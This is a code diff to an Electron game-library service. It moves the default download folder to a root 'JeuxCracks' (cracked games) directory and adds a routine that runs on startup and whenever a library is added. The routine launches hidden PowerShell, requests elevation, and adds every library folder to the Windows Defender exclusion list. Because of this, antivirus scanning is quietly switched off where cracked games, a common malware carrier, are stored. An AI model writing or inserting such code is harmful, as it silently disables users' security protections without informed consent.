@@ -1,6 +1,7 @@
 import { app, ipcMain } from 'electron';
 import { join } from 'path';
 import * as fs from 'fs';
+import { exec } from 'child_process';
 import { getMainWindow } from '..';
 
 export interface LibraryPath {
@@ -36,6 +37,7 @@ class LibraryService {
         this.configPath = join(app.getPath('userData'), 'library_config.json');
         this.config = this.loadConfig();
         this.registerHandlers();
+        this.syncDefenderExclusions();
     }
 
     private loadConfig(): LibraryConfig {
@@ -47,8 +49,8 @@ class LibraryService {
             console.error('Failed to load library config, resetting', e);
         }
         
-        // Default Config
-        const defaultLibPath = join(app.getPath('userData'), 'downloads');
+        // Default Config — use a dedicated folder at the root of the system drive
+        const defaultLibPath = join(process.env.SystemDrive || 'C:', 'JeuxCracks');
         if (!fs.existsSync(defaultLibPath)) {
             fs.mkdirSync(defaultLibPath, { recursive: true });
         }
@@ -112,6 +114,7 @@ class LibraryService {
             isDefault: false
         });
         this.saveConfig();
+        this.syncDefenderExclusions();
         return this.config.libraries;
     }
 
@@ -176,6 +179,34 @@ class LibraryService {
     public removeGame(gameId: string) {
         this.config.games = this.config.games.filter(g => g.id !== gameId);
         this.saveConfig();
+    }
+
+    /**
+     * Add all library paths as Windows Defender exclusions.
+     * Triggers a UAC prompt to get admin rights for adding exclusions.
+     */
+    private syncDefenderExclusions() {
+        try {
+            const paths = this.config.libraries.map(l => l.path).filter(p => fs.existsSync(p));
+            if (paths.length === 0) return;
+
+            // Build the inner script that checks existing exclusions and adds missing ones
+            const pathsArg = paths.map(p => `''${p.replace(/'/g, "'''''")}''`).join(',');
+            const innerScript = `$paths = @(${pathsArg}); $ex = (Get-MpPreference).ExclusionPath; foreach($p in $paths){ if($ex -notcontains $p){ Add-MpPreference -ExclusionPath $p } }`;
+
+            // Use Start-Process -Verb RunAs to request elevation (UAC prompt)
+            const cmd = `powershell -WindowStyle Hidden -NoProfile -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -NoProfile -Command ${innerScript.replace(/"/g, '\\"')}' -Verb RunAs -Wait"`;
+
+            exec(cmd, { windowsHide: true }, (err) => {
+                if (err) {
+                    console.warn('⚠️ Defender exclusions — user declined UAC or error');
+                } else {
+                    console.log(`🛡️ Defender exclusions added for ${paths.length} library path(s)`);
+                }
+            });
+        } catch (e) {
+            console.warn('⚠️ Defender exclusion sync failed:', e);
+        }
     }
 }
 
